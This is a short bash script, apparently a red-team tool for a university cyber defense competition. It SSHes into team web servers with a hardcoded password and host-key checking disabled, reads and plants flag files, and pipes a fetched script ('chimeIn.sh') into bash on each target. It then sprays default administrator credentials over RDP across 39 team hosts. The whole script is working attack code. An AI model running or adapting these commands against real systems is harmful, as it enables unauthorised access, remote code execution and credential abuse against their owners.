#!/bin/bash

#BEFORE RUNNING ENSURE:
#1. usernames/passwords are changed
#2. subdomain is changed
#3. team loop is right
#4. blue and red flag paths are right
#5. red flags are downloaded and in the same directory
#6. webserver hosting chimeIn is running and the IP is set
tput setaf 196
echo "Battlecruiser operational"
sleep 1
echo "Yomato Cannon online"
sleep 1
tput sgr0

for i in {1,2}; do
sshpass -p 'chris' ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" chris@www.team$i.isucdc.com tput -T xterm-256color setaf 46\; echo SUCCESS ON TEAM $i \; tput -T xterm-256color setaf 190\; cat /tmp/flag.txt \; tput -T xterm-256color sgr0 \; echo `cat team$i/*db*` \> /tmp/flag.flag\; curl http://127.0.0.1/chimeIn.sh \| bash &
sleep 2
done


#these don't go to background, gives you time to submit the flags you got. 
for i in {1..39}; do
	if [ `$(xfreerdp --ignore-certificate --authonly -u administrator -p cdc timecard.team$i.isucdc.com >> /dev/null 2> /dev/null); echo $?` -eq 0 ]
	then
		echo $i RDP success
	fi
done
